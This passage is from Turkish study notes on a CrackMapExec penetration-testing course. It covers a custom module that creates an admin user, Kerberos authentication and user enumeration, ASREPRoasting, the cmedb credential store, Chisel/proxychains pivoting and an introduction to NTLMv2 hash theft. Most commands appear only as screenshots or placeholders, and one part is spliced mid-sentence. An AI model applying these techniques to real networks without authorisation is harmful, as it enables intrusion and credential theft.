+![Pasted image 20241203150916.png](/img/user/resimler/Pasted%20image%2020241203150916.png)
+
+Son olarak, yeni modülümüz şu şekilde görünmelidir:
+![Pasted image 20241203150932.png](/img/user/resimler/Pasted%20image%2020241203150932.png)
+![Pasted image 20241203151010.png](/img/user/resimler/Pasted%20image%2020241203151010.png)
+![Pasted image 20241203151027.png](/img/user/resimler/Pasted%20image%2020241203151027.png)
+
+
+### Modülümüzü Çalıştırma
+Şimdi modülümüzü herhangi bir seçenekle veya herhangi bir seçenek olmadan çalıştırabiliriz. Önce varsayılan değerlerle çalıştırarak sonuçları görelim.
+
+
+### CME Modülümüzün Çalıştırılması createadmin
+![Pasted image 20241203151110.png](/img/user/resimler/Pasted%20image%2020241203151110.png)
+
+Daha sonra, hem kullanıcı adı hem de parola belirterek çalıştırabiliriz.
+
+![Pasted image 20241203151145.png](/img/user/resimler/Pasted%20image%2020241203151145.png)
+![Pasted image 20241203151149.png](/img/user/resimler/Pasted%20image%2020241203151149.png)
+
+İlk modülümüz çalışıyor, ancak çok daha iyi olabilir. Yürütmeyi iki komuta bölebilir ve kullanıcı zaten oluşturulmuşsa veya şifre politikalara uymuyorsa bir hata gösterebiliriz.
+
+Ayrıca context.log.highlight(p)'den değeri alabilir ve bir hata varsa farklı bir şey gösterebiliriz. Bu kodu geliştirmek için fikirleriniz nelerdir?
+
+Bir şeyleri yapmanın her zaman farklı yolları olacaktır. Bu modülde neleri değiştireceğinizi ve bunu nasıl daha iyi yapacağınızı keşfedin. Bu modülü daha da özelleştirmek, kendi modüllerinizi oluşturmaya başlamak için harika bir yerdir.
+
+
+### Diğer Yazarlardan Öğrenmek
+Artık yeni bir modül oluşturmanın temellerini öğrendiğimize göre, diğer modülleri keşfetmeli ve birkaç fikir edinmeliyiz.
+
+Örneğin, procdump.py modülü procdump.exe çalıştırılabilir dosyasını bir Base64 dizesi olarak kaydeder, ardından Base64 dizesini bir dosyaya dönüştürür ve hedef işletim sisteminde tutar. LSASS'ın işlem kimliğini almak için tasklist komutunu çalıştırır, bunu bir değişkene kaydeder ve işlem kimliğini procdump.exe'nin yürütülmesine bir argüman olarak geçirir.
+
+Başka bir örnek get_description.py . Bu modülü groupmembership modülünü oluşturmak için örnek olarak aldık. Bu modül, bir sorgu gerçekleştirmek ve memberOf özniteliğini almak için ihtiyaç duyduğumuz gibi, sonuçlarını bir LDAP sorgusuna dayalı olarak alır. Kodda bazı değişiklikler yaptık, yeni bir modül oluşturduk ve bir çekme isteği gönderdik. Çekme isteği kabul edildikten sonra tüm topluluk tarafından kullanılabilir olacaktır.
+
+Yeni modüller oluşturmak için MSSQL gibi diğer protokoller için başka örneklere de bakabiliriz.
+
+
+### Çekme İsteği Oluşturma
+CrackMapExec gibi bir proje topluluk tarafından canlı tutulur. Modülümüzün tüm topluluk tarafından kullanılabilir hale geleceği ve aracın kendisinin bir parçası olarak dahil edileceği bir çekme isteği ekleyerek projeye katkıda bulunabiliriz.
+
+Bir çekme isteği yapmak için [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kılavuzunu takip edebilir ve CrackMapExec'e katkıda bulunabiliriz.
+
+İlerleyen bölümlerde, CrackMapExec kullanımı için IPv6, Kerberos Kimlik Doğrulama ve CrackMapExec veritabanında uzmanlaşma gibi bazı bonus konuları tartışacağız.
+
+
+
+### Ek CME İşlevselliği
+CrackMapExec, çeşitli senaryolarda çok faydalı olacak başka yardımcı programlara da sahiptir. Bu bölümde, bunlardan üçünü inceleyeceğiz:
+
+* Audit (Denetim) modu
+* IPv6 desteği
+* Birden fazla cihaza saldırırken tamamlanma yüzdesi
+
+### Audit Mode
+
+5.3.0 sürümünde yeni bir mod eklendi: audit modu. Bu mod, şifreyi veya hash'i tercih ettiğimiz bir karakterle veya hatta en sevdiğimiz emoji ile değiştirir. Bu özellik, bir müşteri raporu yazarken ekran görüntüsünün bulanıklaşmasını önlemeye yardımcı olur.
+
+Audit modunu yapılandırmak için, varsayılan olarak ~/.cme/cme.conf adresinde bulunan yapılandırma dosyasını düzenlememiz ve audit_mode parametresini tercih ettiğimiz karakterle değiştirmemiz gerekir. Bu karakter, CrackMapExec çalıştırılırken parolanın veya hash'in yerini alacaktır. Bu örnek için # karakterini kullanacağız
+
+
+### Enabling Audit Mode
+
+![Pasted image 20241203151754.png](/img/user/resimler/Pasted%20image%2020241203151754.png)
+
+Şimdi çalıştırabilir ve parolanın çıktıda ######## ile değiştirildiğini görebiliriz.
+
+![Pasted image 20241203151816.png](/img/user/resimler/Pasted%20image%2020241203151816.png)
+
+Gördüğümüz gibi, çalıştırma sonucundaki parola # karakteri ile değiştirilir. Ancak, komut şifreyi gösterir. Bu gibi durumlarda, istenen komutu çalıştırmadan önce parolayı bir dosyaya kaydetmek idealdir.
+
+### Denetim Modu Dosyadaki Parola ile Etkinleştirildi
+![Pasted image 20241203151858.png](/img/user/resimler/Pasted%20image%2020241203151858.png)
+
+
+### IPv6 Support
+CrackMapExec'in bir diğer özelliği de IPv6 üzerinden iletişimi desteklemesidir. Çoğu kuruluş, kullanmasalar bile IPv6'yı varsayılan olarak etkinleştirmiştir ve IPv6'nın IPv4'e göre günlük düzeyinde daha az izlenmesi veya anlaşılması bile mümkündür. Bu da ağ saldırılarının gerçekleştirilmesi ve tespit edilmemesi için bir fırsat yaratmaktadır.
+
+Popüler modüller bölümünde gördüğümüz gibi CrackMapExec get_netconnections modülü ile bilgisayarların IPv6'sını tespit etmemizi sağlıyor. Bu modülü kullanalım ve ardından komutu IPv6 üzerinden çalıştırmayı deneyelim.
+
+
+### get_netconnections Modülünü Çalıştırma ve IPv6 Kullanma
+
+![Pasted image 20241203152004.png](/img/user/resimler/Pasted%20image%2020241203152004.png)
+![Pasted image 20241203152012.png](/img/user/resimler/Pasted%20image%2020241203152012.png)
+
+Şimdi IPv6 üzerinden hedefe erişelim.
+![Pasted image 20241203152032.png](/img/user/resimler/Pasted%20image%2020241203152032.png)
+![Pasted image 20241203152041.png](/img/user/resimler/Pasted%20image%2020241203152041.png)
+![Pasted image 20241203152051.png](/img/user/resimler/Pasted%20image%2020241203152051.png)
+
+
+
+### Tamamlanma Yüzdesi
+
+Artık bir tarama çalışırken enter tuşuna basabilirsiniz ve CME size tamamlanma yüzdesini ve taranacak kalan host sayısını verecektir. Bu modül laboratuvarında her seferinde bir host'a saldırıyoruz, ancak daha kapsamlı bir ağ bulduğunuzda, büyük olasılıkla bu özelliği kullanacaksınız. Şimdilik --shares seçeneğini çalıştıralım ve bitmeden önce enter tuşuna basalım.
+
+
+### Tamamlanma Yüzdesi
+![Pasted image 20241203152158.png](/img/user/resimler/Pasted%20image%2020241203152158.png)
+
+Aşağıdaki bölümde, Kerberos kimlik doğrulamasını ve CrackMapExec'in bu kimlik doğrulama yöntemi için içerdiği yeni değişiklikleri tartışacağız.
+
+
+### Kerberos Authentication
+
+Yazma sırasında CrackMapEec, SMB, LDAP ve MSSQL protokolleri için Kerberos Kimlik Doğrulamasını desteklemektedir. Kerberos Kimlik Doğrulamasını kullanmanın iki (2) yolu vardır:
+
+27. ccache dosyasını belirtmek için KRB5CCNAME env adını kullanma. Password Attacks academy modülündeki Pass the Ticket (PtT) from Linux bölümünde Linux'tan Kerberos kullanımı anlatılmaktadır
+28. CrackMapExec 5.4.0'dan başlayarak, artık Kerberos kimlik doğrulaması için bir biletle KRB5CCNAME ortam değişkenini kullanmamız gerekmiyor. Bir kullanıcı adı ve parola veya kullanıcı adı ve hash kullanabiliriz.
+
+Linux'ta Kerberos kimlik doğrulamasını kullanırken göz önünde bulundurulması gereken önemli bir unsur, saldırdığımız bilgisayarın domain ve hedef makinenin FQDN'sini çözümlemesi gerektiğidir. Dahili bir ağdaysak, bilgisayarımızı şirketin DNS'sine domain adı çözümlemeleri yapacak şekilde yapılandırabiliriz, ancak durum böyle değildir. DNS'i yapılandıramayız ve /etc/hosts dosyasına domain controller ve hedef makinemiz için FQDN'i manuel olarak eklememiz gerekecektir.
+
+
+### Setting Up the /etc/hosts File
+
+![Pasted image 20241203152738.png](/img/user/resimler/Pasted%20image%2020241203152738.png)
+
+![Pasted image 20241203152745.png](/img/user/resimler/Pasted%20image%2020241203152745.png)
+
+CrackMapExec'i Kerberos kimlik doğrulaması ile kullanmayı deneyelim.
+
+
+### Username and Password - Kerberos Authentication
+CrackMapExec'i -k veya --kerberos seçeneği olmadan bir kullanıcı adı ve parola veya kullanıcı adı ve hash ile kullandığımızda, NTLM kimlik doğrulaması gerçekleştiririz. Kerberos seçeneğini kullanırsak bunun yerine Kerberos kimlik doğrulamasını kullanabiliriz.
+
+### Kerberos Authentication
+![Pasted image 20241203152841.png](/img/user/resimler/Pasted%20image%2020241203152841.png)
+![Pasted image 20241203152849.png](/img/user/resimler/Pasted%20image%2020241203152849.png)
+
+
+
+### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama
+
+Yeni Kerberos kimlik doğrulama uygulaması ile CrackMapExec, CME içinde kendi Kerbrute'unu oluşturmak için tüm bileşenlere sahiptir. Bu, CME'nin bir kullanıcının domain üzerinde var olup olmadığını ve bu kullanıcının Kerberos ön kimlik doğrulaması (ASREPRoasting) gerektirmeyecek şekilde yapılandırılıp yapılandırılmadığını anlayabileceği anlamına gelir. Bunu aşağıdaki hesaplarla çalışırken görelim: account_not_exist , julio , ve robert .
+
+
+### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama
+![Pasted image 20241203152959.png](/img/user/resimler/Pasted%20image%2020241203152959.png)
+
+Gördüğümüz gibi, Kerbrute CrackMapExec TGT isteklerini ön kimlik doğrulaması olmadan gönderdiğinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasıyla yanıt verirse, kullanıcı adı mevcut değildir. Ancak, KDC ön kimlik doğrulaması isterse, KDC_ERR_PREAUTH_FAILED hatasıyla yanıt verir, bu da kullanıcı adının mevcut olduğu anlamına gelir. Son olarak, asreproast saldırısına karşı savunmasız bir hata hesabı görürsek, daha önce AESREPRoast Hesaplarını Bulma bölümünde gördüğümüz gibi AESREPoast saldırılarına karşı hassastır.
+
+Bu, oturum açma hatalarına neden olmaz, bu nedenle herhangi bir hesabı kilitlemez, ancak Kerberos günlüğü etkinleştirilmişse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralı bir Windows olay kimliği oluşturur.
+
+
+### Using AES-128 or AES-256
+Kerberos Kimlik Doğrulaması için AES-128 veya AES-256 hash'lerini de kullanabiliriz, Impacket'ten Secretsdump gibi araçlar genellikle bu tür hash'leri alabilir. AES-128 veya AES-256 kullanırsak, trafiğimiz normal Kerberos trafiğine daha çok benzeyecek ve operasyonel bir avantajı (opsec) temsil edecektir. Secretsdump'ı kullanalım ve ardından kimlik doğrulaması için AES256'yı kullanalım.
+
+
+### AES256 ile Kimlik Doğrulama
+
+![Pasted image 20241203153254.png](/img/user/resimler/Pasted%20image%2020241203153254.png)
+
+![Pasted image 20241203153303.png](/img/user/resimler/Pasted%20image%2020241203153303.png)
+
+
+### CCache file - Kerberos Authentication
+
+Bir kimlik bilgisi önbelleği (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanıcının oturumu sürdüğü sürece geçerli kalırlar, bu nedenle hizmetlere birden fazla kez kimlik doğrulaması yapmak (örneğin, bir web veya posta sunucusuna birden fazla kez bağlanmak) her seferinde KDC ile iletişim kurmayı gerektirmez.
+
+Çoğu durumda, Linux makineleri Kerberos biletlerini ccache dosyaları olarak depolar, sistemlerin biletleri kullanma şekli, ccache dosyasının yolunu gösteren KRB5CCNAME ortam değişkeni aracılığıyla olur. robert kullanıcısı için bir bilet (ccache dosyası) oluşturalım ve DC01'e kimlik doğrulaması yapalım
+
+Bileti oluşturmak için [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracını kullanacağız ve KRB5CCNAME ortam değişkenini getTGT.py tarafından oluşturulan ccache dosyasının yoluna ayarlayacağız.
+
+
+### Ticket Granting Tickets
+
+![Pasted image 20241203153521.png](/img/user/resimler/Pasted%20image%2020241203153521.png)
+
+![Pasted image 20241203153540.png](/img/user/resimler/Pasted%20image%2020241203153540.png)
+
+Kerberos kimlik doğrulama yöntemimiz olarak KRB5CCNAME ortam değişkenini kullanmak için --use-kcache seçeneğini kullanmamız gerekir. Kullanıcı adı ve parola seçenekleri gerekli değildir.
+
+
+### ccache Dosyasını Kerberos Kimlik Doğrulama Yöntemi Olarak Kullanma (SMB Protokolü)
+
+![Pasted image 20241203153620.png](/img/user/resimler/Pasted%20image%2020241203153620.png)
+
+
+### Kerberos Kimlik Doğrulama Yöntemi Olarak ccache Dosyasının Kullanılması (LDAP Protokolü)
+
+![Pasted image 20241203153647.png](/img/user/resimler/Pasted%20image%2020241203153647.png)
+Kerberos Kimlik Doğrulamasını MSSQL protokolü ile kullanmak için hedef olarak IP adresi yerine bilgisayar adını veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolünün perde arkasında IP'yi FQDN'ye dönüştürmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasıdır.
+
+
+### MSSQL Protokolü ile ccache Dosyasını Kullanma
+
+![Pasted image 20241203153720.png](/img/user/resimler/Pasted%20image%2020241203153720.png)
+
+Kullanıcı adları ve parolalarla yaptığımız gibi Kerberos kimlik doğrulaması ile herhangi bir modülü veya seçeneği çalıştırabiliriz
+
+
+### Kerberos Kimlik Doğrulaması ile Paylaşımları Listeleme
+
+![Pasted image 20241203153749.png](/img/user/resimler/Pasted%20image%2020241203153749.png)
+![Pasted image 20241203153756.png](/img/user/resimler/Pasted%20image%2020241203153756.png)
+
+
+CrackMapExec ile Kerberos Authentication'ın nasıl kullanılacağını öğrendik. Aşağıdaki bölümde, CrackMapExec veritabanı cmedb ile etkileşime gireceğiz
+
+
+### CMEDB'de Uzmanlaşmak
+
+CME otomatik olarak tüm kullanılan/dökülen kimlik bilgilerini (diğer bilgilerle birlikte) ilk çalıştırmada kurulan SQLite veritabanında saklar. Tüm çalışma alanları ve ilgili veritabanları ~/.cme/workspaces içinde saklanır. Varsayılan veritabanları ~/.cme/workspaces/default dizininde bulunur. Bu dizinde her protokol için bir SQLite dosyası bulunur.
+
+
+### Varsayılan Veritabanlarını Listeleme
+
+![Pasted image 20241203153927.png](/img/user/resimler/Pasted%20image%2020241203153927.png)
+
+### Veritabanı ile Etkileşim
+
+CME, back-end veritabanı ile etkileşimi kolaylaştıran ikinci bir komut satırı script'i olan cmedb ile birlikte gelir. cmedb komutunu yazmak bizi bir komut kabuğuna götürecektir:
+
+### CMEDB
+![Pasted image 20241203154012.png](/img/user/resimler/Pasted%20image%2020241203154012.png)
+
+
+### Workspaces
+Varsayılan çalışma alanı adı varsayılan olarak adlandırılır (bilgi isteminde gösterildiği gibi). Bir çalışma alanı seçildiğinde, CME'de yaptığımız her şey bu çalışma alanında saklanacaktır. Bir çalışma alanı oluşturmak için, cmedb (varsayılan) > komut isteminin root'una gitmemiz gerekir. Eğer protokol veritabanındaysak, geri komutunu kullanmamız gerekir.
+
+
+### Creating a Workspace
+
+![Pasted image 20241203154232.png](/img/user/resimler/Pasted%20image%2020241203154232.png)
+
+Çalışma alanlarını listelemek için workspace list , çalışma alanını değiştirmek için ise workspace "workspace" yazabiliriz.
+
+
+### Çalışma Alanlarını Listeleme ve Değiştirme
+
+
+![Pasted image 20241203154332.png](/img/user/resimler/Pasted%20image%2020241203154332.png)
+![Pasted image 20241203154335.png](/img/user/resimler/Pasted%20image%2020241203154335.png)
+
+
+### Bir Protokolün Veritabanına Erişim
+
+cmedb her protokol için bir veritabanına sahiptir, ancak bu modülün yazıldığı sırada yalnızca SMB ve MSSQL yararlı seçeneklere sahiptir:
+
+![Pasted image 20241203154400.png](/img/user/resimler/Pasted%20image%2020241203154400.png)
+
+Bir protokolün veritabanına erişmek için proto protocol komutunu çalıştırın. Protokol içinde, mevcut seçenekleri görüntülemek için help seçeneğini kullanabiliriz:
+
+
+### SMB Protokol Veritabanına Bağlanma
+![Pasted image 20241203154437.png](/img/user/resimler/Pasted%20image%2020241203154437.png)
+
+
+### Protocol Options
+SMB veya MSSQL protokolünü her kullandığımızda, kimlik bilgileri, saldırdığımız hostlar, eriştiğimiz paylaşımlar ve listelediğimiz gruplar CrackMapExec veritabanında saklanır. Veritabanında sahip olduğumuz verilere erişelim.
+
+### Kimlik Bilgilerini Görüntüleme
+CrackMapExec veritabanı, CrackMapExec kullanarak kullandığımız veya elde ettiğimiz tüm kimlik bilgilerini depolar. Bu veritabanı, kimlik bilgilerinin türünü, düz metin veya hash olup olmadığını, domain, kullanıcı adı ve şifreyi saklar. SMB protokolünün kimlik bilgilerini görmek için protokol içindeki creds seçeneğini kullanmamız gerekir.
+
+
+### Displaying SMB Credentials
+
+![Pasted image 20241203154559.png](/img/user/resimler/Pasted%20image%2020241203154559.png)
+
+![Pasted image 20241203154618.png](/img/user/resimler/Pasted%20image%2020241203154618.png)
+
+Gördüğünüz gibi, creds'ten sonra bir kullanıcı adı ekleyerek belirli kullanıcıları da sorgulayabiliriz. Ayrıca creds hash seçeneği ile tüm hash'leri veya creds plaintext seçeneği ile tüm plaintext kimlik bilgilerini listeleyebiliriz.
+
+
+### Hash'leri ve Düz Metin Kimlik Bilgilerini Görüntüleme
+
+![Pasted image 20241203154648.png](/img/user/resimler/Pasted%20image%2020241203154648.png)
+
+![Pasted image 20241203154654.png](/img/user/resimler/Pasted%20image%2020241203154654.png)
+
+Not: cmedb, mevcut seçenekleri görüntülemek için sekme otomatik tamamlamaya izin verir
+
+MSSQL kimlik bilgileri MSSQL protokolüne kaydedilir ve SMB kimlik bilgilerini görüntülediğimiz gibi görüntülenebilir
+
+
+### MSSQL için Kimlik Bilgilerini Görüntüleme
+![Pasted image 20241203154752.png](/img/user/resimler/Pasted%20image%2020241203154752.png)
+
+Not: Domain alanını bir bilgisayar ile görüyorsak, bu bir MSSQL hesabı kullandığımız anlamına gelir.
+
+
+### Kimlik Bilgilerini Kullanma
+
+CrackMapExec'i çalıştırmak için veritabanındaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediğimiz kimlik bilgilerini tanımlamamız ve hangi id'nin hesapla ilişkili olduğunu belirlememiz gerekir. Julio'nun kimlik bilgilerini id 4 ile kullanalım. Kullanıcı adı ve parola yerine bir kimlik bilgisi kullanmak için -id CredID seçeneğini kullanmamız gerekir.
+
+### CrackMapExec ile Etkileşim için CredID Kullanımı
+
+![Pasted image 20241203154910.png](/img/user/resimler/Pasted%20image%2020241203154910.png)
+
+
+### Hosts Information
+
+MSSQL ve SMB için, erişim sağladığımız bilgisayarları, IP'lerini, domainlerini ve işletim sistemlerini de belirleyebiliriz.
+
+
+### Displaying Hosts
+![Pasted image 20241203155109.png](/img/user/resimler/Pasted%20image%2020241203155109.png)
+
+![Pasted image 20241203155117.png](/img/user/resimler/Pasted%20image%2020241203155117.png)
+
+
+### Share Information
+
+CME veritabanı da belirlediğimiz paylaşımlı klasörleri saklıyor ve okuma ve yazma erişimine sahip kullanıcılarımız olup olmadığını bize söylüyor. Paylaşım bilgilerine erişmek için cmedb içerisinde SMB protokolü içerisinde shares seçeneğini kullanmamız gerekiyor.
+
+### Paylaşımları Geri Alma
+
+![Pasted image 20241203155153.png](/img/user/resimler/Pasted%20image%2020241203155153.png)
+
+
+### Kullanıcı Ekleme ve Kaldırma
+CME, kullanıcıları veritabanından manuel olarak ekleme veya kaldırma özelliğini destekler. Protokolü (SMB veya MSSQL) seçiyoruz ve creds add veya creds remove kullanıyoruz.
+
+
+### cmedb'ye Kullanıcı Ekleme
+
+![Pasted image 20241203155239.png](/img/user/resimler/Pasted%20image%2020241203155239.png)
+Şimdi eklediğimiz kullanıcıyı kaldırmayı deneyebiliriz.
+
+
+### Bir Kullanıcıyı cmedb'den Kaldırma
+
+![Pasted image 20241203155300.png](/img/user/resimler/Pasted%20image%2020241203155300.png)
+
+![Pasted image 20241203155318.png](/img/user/resimler/Pasted%20image%2020241203155318.png)
+
+
+### Empire Kimlik Bilgilerini İçe Aktarma
+cmedb'nin sahip olduğu bir başka özellik de Empire'dan kimlik bilgilerini içe aktarma yeteneğidir.
+
+
+### Import from Empire
+
+![Pasted image 20241203155352.png](/img/user/resimler/Pasted%20image%2020241203155352.png)
+
+Not: Bu özelliği kullanmak istiyorsanız Empire'ı yapılandırdığınızdan emin olun
+
+### Export cmedb Data
+
+CrackMapExec veritabanından kimlik bilgilerini, hostları, local adminleri ve paylaşımları dışarı aktarabiliriz
+
+
+### Kimlik Bilgilerini cmedb'den Dışa Aktarma
+
+![Pasted image 20241203155453.png](/img/user/resimler/Pasted%20image%2020241203155453.png)
+
+![Pasted image 20241203155458.png](/img/user/resimler/Pasted%20image%2020241203155458.png)
+
+Veriler CSV dosyası olarak dışa aktarılır. LibreOffice veya Excel gibi araçları kullanarak açabiliriz.
+
+![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)
+
+
+
+### skill 
+
+CrackMapExec aracı hakkında derinlemesine bir eğitim kursu aldıktan sonra ilk Dahili Sızma Testinizi gerçekleştiren bir Sızma Test Uzmanısınız. Müşteriniz INLANEFREIGHT CORP, Active Directory ortamını değerlendirmek için firmanızı işe aldı. İlk göreviniz geçerli bir hesap bulmak ve farklı protokoller kullanarak ortak bir parola denemek. Müşteriniz herhangi bir kesinti süresini göze alamaz, bu nedenle herhangi bir hesabı kilitlememeye dikkat etmeniz gerekir. Geçerli bir hesap bulduğunuzda, diğer hesapları ele geçirmenize yardımcı olacak ilginç bilgileri bulmak için numaralandırın, numaralandırın, numaralandırın. Unutmayın, amacınız alan yöneticisi erişimi elde edene kadar mümkün olduğunca çok hesabı ele geçirmektir. Amacınız hedef etki alanını ele geçirmek ve NTDS dosyasının içeriğini elde etmektir. Bu modülü dikkatle takip ettiyseniz, uzun sürmeyecektir.
+
+
+### Hedef ortama bağlanma adımları
+
+Uzaktan dahili bir sızma testi yapıyorsunuz, bu nedenle önce VPN'e bağlanmanız ve oradan 172.16.15.0/24 hedef ağına dahili numaralandırma yapmanız gerekecek. Dahili şirket ağına bağlanmak için aşağıdaki gibi Chisel ve proxyychains kullanmanız gerekecektir:
+
+
+### Connecting to the Internal Network VPN
+
+![Pasted image 20241203155738.png](/img/user/resimler/Pasted%20image%2020241203155738.png)
+![Pasted image 20241203155743.png](/img/user/resimler/Pasted%20image%2020241203155743.png)
+
+Chisel ile kullanmayı seçtiğiniz bağlantı noktasıyla eşleşmesi için /etc/proxychains.conf dosyasını değiştirmeyi unutmayın.
+
+Hedef sistemi başlattığınızda, 10.129.204.182 örnek IP'sini hedef IP'nizle değiştirin.
+
+Dahili ağı numaralandırmak için şu komutu kullanabilirsiniz: 
+proxychains crackmapexec [protocol] [target] CME ile Proxychains bölümünde gösterildiği gibi., 'netlogon', 'sysvol']
+SPIDER_P... 10.129.203.121 445 DC01 [*] EXT:
+['ico', 'lnk']
+SPIDER_P... 10.129.203.121 445 DC01 [*] SIZE: 51200
+SPIDER_P... 10.129.203.121 445 DC01 [*] OUTPUT:
+/tmp/cme_spider_plus
+
+```
+
+{{CODE_BLOCK_96}}
+
+Not: Sabırlı olmamız gerekiyor. Paylaşılan klasör ve dosya sayısına bağlı olarak işlem birkaç dakika sürebilir
+
+`spider_plus` modülü için mevcut tüm seçenekleri görüntülemek için `--options` seçeneğini kullanabiliriz:
+
+
+### Spider_plus Options
+
+{{CODE_BLOCK_97}}
+
+Bir sonraki bölümde CrackMapExec'in bir `proxy` aracılığıyla diğer ağlara ulaşmak için nasıl kullanılacağı anlatılacaktır.
+
+
+---
+
+
+### Proxychains with CME
+
+### Scenario
+
+İnternal bir Pentest üzerinde çalışıyoruz. Bir ağ taraması gerçekleştirdik ve yalnızca bir host (10.129.204.133) tespit edip ele geçirebildik. Ele geçirilen bu host üzerinde `ipconfig` çalıştırdığımızda, iki ağ bağdaştırıcısı olduğunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip başka bir hostu gösteriyor. Topladığımız bilgilere dayanarak aşağıdaki senaryoya sahibiz:
+
+![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)
+
+DC01'e ve bu ağdaki (172.16.1.0/24) herhangi bir makineye saldırmak için, saldırı hostumuz ile MS01 arasında bir `tünel` kurmalıyız. Bu nedenle, CME tarafından yürütülen tüm komutlar MS01 üzerinden geçer.
+
+
+### Set Up the Tunnel
+
+Tünelimizi kurmak için [Chisel](https://github.com/jpillora/chisel) kullanacağız. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldıracağımız makinemiz için en son Windows binary'sini ve saldırı hostumuzda kullanmak için en yeni Linux binary'sini indirelim ve aşağıdaki adımları gerçekleştirelim:
+
+*  Chisel'ı Saldırı Hostumuza indirin ve Çalıştırın:
+
+### Chisel - Reverse Tunnel
+
+{{CODE_BLOCK_98}}
+
+
+*  Chisel for Windows'u İndirin ve Hedef Host'a Yükleyin:
+
+
+### Upload Chisel
+
+{{CODE_BLOCK_99}}
+
+
+* CrackMapExec komut yürütme seçeneği `-x`'i kullanarak Chisel sunucumuza bağlanmak için `chisel.exe` dosyasını çalıştırın (Bu seçeneği Komut Yürütme bölümünde daha fazla tartışacağız)
+
+
+### Connect to the Chisel Server
+
+{{CODE_BLOCK_100}}
+
+Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar çalışmaya devam edecektir. Bunu bu bölümde daha sonra yapacağız.
+
+**Attack host** üzerinde, **Chisel server** çıktısında **bir client bağlantısı aldığımızı ve tüneli başlattığımızı** gösteren yeni bir satır görmeliyiz.
+
+### Chisel Receiving Session No. 1
+
+{{CODE_BLOCK_101}}
+
+TCP 1080 portunun dinlenip dinlenmediğini kontrol ederek de tünelin çalıştığını doğrulayabiliriz:
+
+
+### Check Listening Port
+
+{{CODE_BLOCK_102}}
+
+* Proxyychains'i Chisel varsayılan portu `TCP 1080`'i kullanacak şekilde yapılandırmamız gerekir. Yapılandırma dosyasının ProxyList bölümüne `socks5 127.0.0.1 1080`'i aşağıdaki gibi eklediğimizden emin olmamız gerekiyor:
+
+
+### Configure Proxychains
+
+{{CODE_BLOCK_103}}
+
+* Artık 172.16.1.10 IP'sine ulaşmak için `Proxychains` aracılığıyla CrackMapExec'i kullanabiliriz:
+
+### CrackMapExec'in Proxychains ile Test Edilmesi
+
+{{CODE_BLOCK_104}}
+
+
+Proxychains çıktısını konsoldan kaldırmak için `Proxychains4` ve `quiet -q` seçeneğini kullanabiliriz:
+
+### Quiet Seçeneği ile Proxychains4
+
+{{CODE_BLOCK_105}}
+
+Proxychains aracılığıyla herhangi bir CME işlemi gerçekleştirebiliriz.
+
+
+### Killing Chisel on the Target Machine
+
+İşimiz bittiğinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak için, PowerShell komutlarını yürütmek için `-X` seçeneğini kullanacağız ve PowerShell komutunu çalıştıracağız `Stop-Process - Name chisel -Force .` Komut yürütme konusunu Komut Yürütme bölümünde daha ayrıntılı olarak ele alacağız.
+
+
+### Kill the Chisel Client
+
+{{CODE_BLOCK_106}}
+
+Bunu yaptıktan sonra, Chisel client komutunu çalıştırdığımız terminal aşağıdaki gibi sonuçlanmalıdır:
+
+
+### Chisel'i Zorla Durdurduktan Sonra Terminalin Kapanması
+
+{{CODE_BLOCK_107}}
+
+Artık saldırı konağımızdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.
+
+
+### Attack Host Üzerinde Chisel'i Kapatma
+
+{{CODE_BLOCK_108}}
+
+
+### Sunucu olarak Windows ve Client olarak Linux
+
+Chisel'i Windows workstation'da bir sunucu olarak başlatarak ve saldırı hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak başlatmak için `server --socks5` seçeneğini kullanacağız.
+
+
+### Chisel'i Hedef Makinede Sunucu Olarak Başlatma
+
+{{CODE_BLOCK_109}}
+
+Şimdi hedef makinemiz Chisel sunucusuna bağlanmak ve proxy'yi etkinleştirmek için IP ve porttan sonra `socks` seçeneğini kullanmamız gerekiyor.
+
+
+### Attack Hostumuzdan Chisel Sunucusuna Bağlanma
+
+{{CODE_BLOCK_110}}
+
+Şimdi Proxychains'i tekrar kullanabiliriz:
+
+### Internal Network'e Bağlanmak için Proxy Chain'i Kullanma
+
+{{CODE_BLOCK_111}}
+
+Bu bölümde, **attack host** üzerinde **Proxychains** ve **Chisel** yapılandırmayı ve **CrackMapExec** kullanarak hedef makinede **Chisel** çalıştırmayı öğrendik.
+
+İlerleyen bölümlerde, diğer ağlara ulaşmak için `CrackMapExec` ve `Proxychains` kullanacağız.
+
+---
+
+### Stealing Hashes
+
+Yeni hesapları ele geçirmek için kullanılan en yaygın tekniklerden biri parola hashlerinin çalınmasıdır. Bunu başarmanın farklı yöntemleri vardır, ancak yaygın olanı, bir bilgisayarı veya kullanıcıyı kontrol ettiğimiz sahte bir paylaşılan klasörle bir kimlik doğrulama işlemi başlatmaya zorlamaktır.
+
+Bu kimlik doğrulama işlemini başlatırken, kullanıcı veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araç kullanılarak kırılabilir veya kimlik bilgilerini bilmeden kullanıcının kimliğine bürünmek için başka bir bilgisayara iletilebilir.
+
